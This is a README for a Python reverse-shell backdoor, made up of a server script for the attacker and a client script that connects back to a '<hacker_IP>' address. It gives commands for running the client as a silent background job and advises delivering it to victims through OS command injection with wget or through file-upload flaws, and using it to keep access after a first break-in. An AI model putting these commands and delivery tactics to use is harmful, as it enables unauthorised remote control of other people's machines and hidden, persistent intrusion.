# Usage

## On Hacking machine
`python3 reverseShellServer.py`

## On Client machine
`python3 reverseShellClient.py <hacker_IP>`

### Or run as a backgroud job
`nohup python3 reverseShellClient.py <hacker_ip> &> /dev/null &`


### Port as an optional argument
Both scripts communicate on port 8000 by default.
This can be changed to another port - but you would need to make sure both scripts have the same port..

#### On Hacking machine
`python3 reverseShellServer.py <port>`

#### On Client machine
`python3 reverseShellClient.py <hacker_IP> <port>`

### Getting the reverse shell backdoor exploit onto a client machine
- Perform OS injection and run wget to download the script onto the victim's machine
- Find a file upload vulnerability and upload the file onto the victim's machine

### Running the reverse shell on a client machine
- OS Injection
- Possible if you already found one way in and want to maintain access
